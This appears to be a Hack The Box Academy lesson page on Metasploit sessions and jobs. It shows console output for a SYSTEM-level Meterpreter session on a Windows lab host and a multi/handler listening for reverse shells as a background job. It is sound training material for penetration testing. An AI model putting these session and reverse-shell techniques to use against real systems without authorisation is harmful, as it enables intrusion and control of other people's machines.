<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/39/section/415
// Platform Version: V1
// Module ID: 39
// Module Name: Using the Metasploit Framework
// Module Difficulty: Easy
// Section ID: 415
// Section Title: Sessions & Jobs
// Page Title: Hack The Box - Academy
// Page Number: 10
-->

# Sessions & Jobs

**Module Name:** Using the Metasploit Framework **Page Number:** 10

#### 

#### USING THE METASPLOIT FRAMEWORK

# Sessions

## Using Sessions

#### Listing Active Sessions

``` shell-session
msf6 exploit(windows/smb/psexec_psh) > sessions

Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -> 10.10.10.205:50501 (10.10.10.205)
```

#### Interacting with a Session

``` shell-session
msf6 exploit(windows/smb/psexec_psh) > sessions -i 1
[*] Starting interaction with 1...

meterpreter >
```

## Jobs

#### Viewing the Jobs Command Help Menu

``` shell-session
msf6 exploit(multi/handler) > jobs -h
Usage: jobs [options]

Active job manipulation and interaction.

OPTIONS:

    -K        Terminate all running jobs.
    -P        Persist all running jobs on restart.
    -S <opt>  Row search filter.
    -h        Help banner.
    -i <opt>  Lists detailed information about a running job.
    -k <opt>  Terminate jobs by job ID and/or range.
    -l        List all running jobs.
    -p <opt>  Add persistence to job by job ID
    -v        Print more detailed info.  Use with -i and -l
```

#### Viewing the Exploit Command Help Menu

``` shell-session
msf6 exploit(multi/handler) > exploit -h
Usage: exploit [options]

Launches an exploitation attempt.

OPTIONS:

    -J        Force running in the foreground, even if passive.
    -e <opt>  The payload encoder to use.  If none is specified, ENCODER is used.
    -f        Force the exploit to run regardless of the value of MinimumRank.
    -h        Help banner.
    -j        Run in the context of a job.
	
<SNIP
```

#### Running an Exploit as a Background Job

``` shell-session
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.34:4444
```

#### Listing Running Jobs

``` shell-session
msf6 exploit(multi/handler) > jobs -l

Jobs
====

 Id  Name                    Payload                    Payload opts
 --  ----                    -------                    ------------
 0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444
```

# 

# 

#### Questions

####